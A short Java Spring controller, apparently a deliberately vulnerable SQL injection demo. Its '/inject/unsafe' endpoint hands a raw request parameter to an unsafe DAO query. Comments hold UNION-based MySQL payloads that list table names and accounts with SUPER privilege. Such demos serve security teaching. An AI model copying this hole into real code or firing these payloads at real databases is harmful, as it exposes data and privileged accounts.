package com.examples.security.sql;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.List;

@RestController
public class InjectController {

    @Autowired
    AccountDAO accountDAO;

    @GetMapping("/inject/unsafe")
    public List<AccountDTO> getAccountDAO(@RequestParam(name = "param") String param){
//       1' UNION ALL (select group_concat(TABLE_NAME) COLLATE UTF8_GENERAL_CI from information_schema.tables where table_schema = DATABASE()) #'

        //1' UNION ALL (SELECT grantee COLLATE UTF8_GENERAL_CI FROM information_schema.user_privileges WHERE privilege_type = 'SUPER') #'


//        1' UNION ALL (SELECT
//        grantee COLLATE UTF8_GENERAL_CI,
//                privilege_type COLLATE UTF8_GENERAL_CI,
//        is_grantable COLLATE UTF8_GENERAL_CI,
//                123 as col3
//        FROM information_schema.user_privileges WHERE privilege_type = 'SUPER') #
        return accountDAO.unsafeFindAccountsByCustomerId(param);
    }
}
